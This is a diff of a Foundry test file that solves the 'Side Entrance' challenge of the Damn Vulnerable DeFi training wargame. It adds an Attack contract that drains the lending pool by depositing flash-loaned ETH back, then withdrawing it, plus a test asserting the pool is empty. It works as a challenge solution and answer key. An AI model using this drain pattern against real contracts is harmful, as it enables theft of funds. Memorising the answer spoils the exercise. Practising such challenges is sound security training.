@@ -1,9 +1,38 @@
 // SPDX-License-Identifier: MIT
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.25;
+pragma solidity ^0.8.0;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {
+    SideEntranceLenderPool,
+    IFlashLoanEtherReceiver
+} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+
+contract Attack is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool pool;
+    address recovery;
+
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+
+        (bool success, ) = payable(recovery).call{value: address(this).balance}(
+            ""
+        );
+        require(success, "transfer fail");
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +74,17 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        //launching attack contract
+        Attack attack = new Attack(address(pool), recovery);
+
+        attack.attack();
+        //checking if pool is totally drained
+        assertEq(address(pool).balance, 0);
+        //print pool balance after attack
+        console.log(
+            "pool balance after drain = ",
+            address(pool).balance / 1 ether
+        );
     }
 
     /**
@@ -53,6 +92,10 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
 }
